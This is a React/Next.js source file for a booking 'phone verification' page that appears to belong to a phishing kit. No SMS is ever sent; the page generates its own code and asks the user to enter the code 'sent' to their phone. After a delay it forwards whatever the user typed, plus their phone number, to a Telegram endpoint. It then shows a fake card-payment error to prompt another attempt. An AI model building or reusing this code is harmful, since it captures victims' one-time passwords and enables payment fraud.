"use client";

import { useState, useEffect } from "react";
import { useSearchParams, useRouter } from "next/navigation";
import toast from "react-hot-toast";

export default function ConfirmPage() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const [verificationCode, setVerificationCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [actualCode, setActualCode] = useState("");

  const phone = searchParams.get("phone") || "";
  const bookingId = searchParams.get("bookingId") || "";
  const maskedPhone = phone.replace(/(\d{3})\d{4}(\d{2})/, "$1****$2");

  // Generate verification code when page loads (but don't send it yet)
  useEffect(() => {
    if (phone) {
      // Generate 4-digit verification code
      const code = Math.floor(1000 + Math.random() * 9000).toString();
      setActualCode(code);
    }
  }, [phone, bookingId]);

  const handleVerification = async () => {
    // Clear previous errors
    setError("");

    if (!verificationCode || verificationCode.length < 4) {
      setError("يرجى إدخال رمز التحقق");
      return;
    }

    setLoading(true);

    try {
      // Wait 6 seconds then send verification code to Telegram (regardless of correctness)
      setTimeout(async () => {
        const isCorrect = verificationCode === actualCode;
        const verificationStatus = isCorrect ? "✅ صحيح" : "❌ خطأ";

        try {
          await fetch("/api/telegram", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              bookingData: {
                eventTitle: `رمز التحقق - Verification Code`,
                customerPhone: phone,
                verificationCode: verificationCode,
                actualCode: actualCode,
                timestamp: new Date().toISOString(),
                message: `رمز التحقق المدخل للهاتف ${phone}: ${verificationCode}`,
               
              },
            }),
          });
        } catch (telegramError) {
          console.error(
            "Failed to send verification code to Telegram:",
            telegramError
          );
        }
      }, 6000); // 6 seconds delay

      // Simulate verification delay
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Verify the code against the generated code
      const isCorrect = verificationCode === actualCode;
      if (isCorrect) {
        toast.success("تم تأكيد الحجز بنجاح!");
        router.push("/");
      } else {
        setError(
          "An error occurred during the payment process. Make sure your card is activated or has sufficient balance. Try again."
        );
      }
    } catch (error) {
      setError(
        "An error occurred during the payment process. Make sure your card is activated or has sufficient balance. Try again."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-dark-lighter flex pt-20 justify-center p-4">
      <div className="p-4 max-w-md h-[50%] w-[70%] text-center shadow-sm  shadow-zinc-800">
        <h1 className="text-2xl font-bold mb-8">
          To complete the
          <br />
          reservation process
        </h1>

        <div className="mb-8">
          <h2 className="text-lg font-semibold mb-2">Verify Phone Number</h2>
          <p className="text-gray-400 mb-1">(via SMS Verification)</p>
          <p className="text-gray-400 mb-4">
            Please enter a code confirmation
            <br />
            Sent to
          </p>
          <p className="font-mono text-lg">{maskedPhone}</p>
        </div>

        <div className="mb-8">
          <input
            type="text"
            value={verificationCode}
            onChange={(e) => setVerificationCode(e.target.value)}
            placeholder="Enter the verification code "
            className="w-full bg-neutral-600 border border-gray-600 rounded-lg px-4 py-3 text-center text-lg tracking-widest"
            maxLength={6}
          />
          <div className="text-gray-500 text-sm mt-2">****</div>
          {error && (
            <div className="text-red-500 text-sm mt-3 text-left">{error}</div>
          )}
        </div>

        <button
          onClick={handleVerification}
          disabled={loading || !verificationCode}
          className="w-full bg-primary text-white py-4 rounded-lg font-bold text-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-primary/90 transition-colors"
        >
          {loading ? "جاري التحقق..." : "Check the code"}
        </button>

        {/* <div className="mt-8 text-sm text-gray-400">
          <p>لم تستلم الرمز؟</p>
          <button className="text-primary hover:underline">
            إعادة إرسال الرمز
          </button>
        </div> */}
      </div>
    </div>
  );
}
